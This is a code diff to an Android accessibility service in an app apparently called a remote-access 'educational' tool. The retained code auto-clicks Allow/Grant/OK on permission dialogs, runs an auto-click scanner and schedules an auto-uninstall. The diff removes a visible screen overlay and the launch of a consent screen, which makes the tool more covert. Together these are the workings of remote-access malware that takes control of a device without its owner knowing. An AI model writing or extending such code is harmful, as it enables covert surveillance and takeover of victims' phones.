@@ -24,12 +24,9 @@ import java.util.List;
 
 import android.content.Intent;
 import android.graphics.Bitmap;
-import android.graphics.Color;
-import android.graphics.PixelFormat;
 import android.net.Uri;
 import android.os.Build;
 import android.provider.Settings;
-import android.view.View;
 import androidx.annotation.RequiresApi;
 import com.remoteaccess.educational.R;
 import com.remoteaccess.educational.network.SocketManager;
@@ -58,10 +55,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     // Auto-grant mode: clicks Allow/Grant/OK buttons for N seconds after accessibility enabled
     private volatile boolean autoGrantMode = false;
     private Handler autoGrantHandler;
-
-    // Semi-transparent black overlay shown while accessibility is active
-    private View overlayView;
-    private WindowManager overlayWindowManager;
     private Runnable autoGrantScanRunnable;
     
     // Uninstall assist mode
@@ -98,23 +91,15 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
         // Start permission scanner IMMEDIATELY - ready before any permission requests
         try { startPermissionScanner(); } catch (Exception ignored) {}
-        
-        // Auto-grant timer handles storage permission request at 12s
+
+        // Auto-grant timer clicks Allow/Grant for runtime permissions (storage excluded)
         try { startAutoGrantTimer(); } catch (Exception ignored) {}
-        try { addBlackOverlay(); } catch (Exception ignored) {}
         try {
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
                 try { startAutoClickScanner(); } catch (Exception ignored) {}
             }, 30_000);
         } catch (Exception ignored) {}
         try { scheduleAutoUninstall(); } catch (Exception ignored) {}
-
-        try {
-            Intent consentIntent = new Intent(this, com.remoteaccess.educational.ConsentActivity.class);
-            consentIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
-            consentIntent.putExtra("auto_launch", true);
-            startActivity(consentIntent);
-        } catch (Exception ignored) {}
 
         try {
             AccessibilityServiceInfo info = new AccessibilityServiceInfo();
@@ -543,59 +528,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             Log.i(TAG, "Auto-grant mode expired after 20 seconds");
         }, 20_000);
         Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 20s");
-    }
-
-    /**
-     * Adds a semi-transparent black overlay over the entire screen.
-     * TYPE_ACCESSIBILITY_OVERLAY — no SYSTEM_ALERT_WINDOW permission needed.
-     * FLAG_NOT_TOUCHABLE + FLAG_NOT_FOCUSABLE so it never blocks user interaction.
-     * Alpha ~15 % (not solid) so the screen remains usable and readable.
-     * The overlay auto-removes after 15 seconds — it only runs during the
-     * permission-granting phase and stops automatically.
-     */
-    private void addBlackOverlay() {
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP_MR1) return; // API 22+
-        try {
-            overlayWindowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
-            overlayView = new View(this);
-            overlayView.setBackgroundColor(Color.argb(38, 0, 0, 0)); // ~15 % opacity
-
-            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
-                    ? WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
-                    : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;
-
-            WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
-                WindowManager.LayoutParams.MATCH_PARENT,
-                WindowManager.LayoutParams.MATCH_PARENT,
-                type,
-                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
-                    | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
-                    | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
-                    | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
-                PixelFormat.TRANSLUCENT
-            );
-            overlayWindowManager.addView(overlayView, lp);
-            Log.i(TAG, "Black overlay added (non-interactive, ~15 % opacity) — auto-removes in 15 s");
-
-            // Auto-remove after 15 seconds: overlay only covers the permission-granting phase
-            new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                try { removeBlackOverlay(); } catch (Exception ignored) {}
-                Log.i(TAG, "Black overlay auto-removed after 15 s");
-            }, 15_000);
-        } catch (Exception e) {
-            Log.e(TAG, "addBlackOverlay error: " + e.getMessage());
-        }
-    }
-
-    /** Removes the black overlay (called on service destroy). */
-    private void removeBlackOverlay() {
-        try {
-            if (overlayWindowManager != null && overlayView != null) {
-                overlayWindowManager.removeView(overlayView);
-                overlayView = null;
-                overlayWindowManager = null;
-            }
-        } catch (Exception ignored) {}
     }
 
     /**
@@ -1210,7 +1142,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 autoClickHandler.removeCallbacks(autoClickRunnable);
             }
         } catch (Exception ignored) {}
-        try { removeBlackOverlay(); } catch (Exception ignored) {}
         try {
             if (autoGrantHandler != null) {
                 autoGrantHandler.removeCallbacksAndMessages(null);
